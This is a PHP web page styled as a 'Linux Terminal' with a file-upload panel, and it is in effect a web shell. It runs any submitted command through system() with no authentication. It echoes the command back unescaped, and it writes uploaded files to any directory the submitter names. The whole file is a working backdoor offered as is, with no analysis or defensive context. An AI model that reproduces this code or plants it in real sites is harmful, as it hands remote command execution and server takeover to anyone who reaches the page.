<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linux Terminal</title>
    <style>
        body {
            font-family: monospace;
            background-color: #000;
            color: #fff;
            padding: 30px;
        }
        .terminal {
            width: 100%;
            height: 400px;
            background-color: #333;
            padding: 10px;
            overflow-y: auto;
            border-radius: 5px;
            white-space: pre-wrap;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            font-family: monospace;
            border: none;
            background-color: #333;
            color: #00BEC8;
            outline: none;
            border-bottom: 2px solid #777;
        }
        
        input[type="file"] {
        width: 100%;
        padding: 10px;
        font-family: monospace;
        border: none;
        background-color: #333;
        color: #fff;
        outline: none;
        border-bottom: 2px solid #777;
        }
        a {
            color: #6aff6a;
            text-decoration: none;
        }
        
        ol{
        font-family:monospace;
        white-space:pre;
        }
        li::marker{
        font-size:15px;
        color:gray;
        }
        .dollar{
        bottom:40px;
        color:green;
        }
        
        /* Styling for the button */
        button {
        display: inline-block;
        padding: 12px 24px;
        font-size: 16px;
        font-weight: bold;
        text-decoration: none;
        color: #fff;
        background-color: #5A5A5A;
        border-radius: 5px;
        border: none;
        cursor: pointer;
        transition: background-color 0.3s ease;
        box-shadow: 0 4px 6px rgba(0, 123, 255, 0.1);
        }
        
        /* Hover state */
        button:hover {
        background-color: #000;
        }
        
        /* Active (clicked) state */
        button:active {
        background-color: #000;
        transform: translateY(1px);
        box-shadow: 0 2px 4px rgba(0, 123, 255, 0.1);
        }
        span{
        color:#00BEC8;
        }
    </style>
</head>
<body>
<h1>Command Terminal</h1>
<br>
<form method="post" action="">
<input type="text" id="myTextInput" name="cmd" placeholder="$ Type command here..." value="<?php echo trim($_POST['cmd']) ; ?>" autofocus>
<br>
<br>
<button type="submit"  name="run">Run</button>
</form>
<br>
<br>
    <div class="terminal">
        <div class="dollar">$ <?php echo trim($_POST['cmd']) ; ?></div>
        <pre>
        <code>
        <span>
        <?php 
        // Processing form data when form is submitted
        if($_SERVER["REQUEST_METHOD"] == "POST"){
        //add wallet
        if (isset($_POST['run'])) {
        echo system(trim($_POST['cmd'])); 
        }
        }else{
        echo '<ol><li></ol>'; 
        }
        ?>
        </span>
        </code>
        </pre>
    </div>
    
    <br><br>
    <h1>File Uploade</h1>
    <br>
    
    <?php
    $currentFileName = basename(__FILE__);
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fname'])) {
    $targetDirectory = trim($_POST['dir']);
    $targetFile = $targetDirectory . basename($_FILES['fname']['name']);
    
    // Check file type or other validations if needed
    
    if (move_uploaded_file($_FILES['fname']['tmp_name'], $targetFile)) {
    echo '<script type="text/javascript">alert("File uploaded successfully.")</script>';
    echo "<script> window.location = '".$_SERVER['PHP_SELF']."';</script>";
    } else {
    echo '<script type="text/javascript">alert("Oops! Something went wrong Uploading file. Please try again.")</script>';
    echo "<script> window.location = '".$_SERVER['PHP_SELF']."';</script>";
    }
    }
    
    ?>
    <form method="post" action="" enctype="multipart/form-data">
    <input type="file" name="fname">
    <br><br>
    <label>Destination Directory</label><br>
    <input type="text" name="dir" placeholder="/www/uploade-to/">
    <br><br>
    <button type="submit" name="upload">Uploade File</button>
    </form>
    <br><br>
    
    <script type="text/javascript">
    var input = document.getElementById('myTextInput');
    input.focus();
    input.select();
    
    </script>
    
</body>
</html>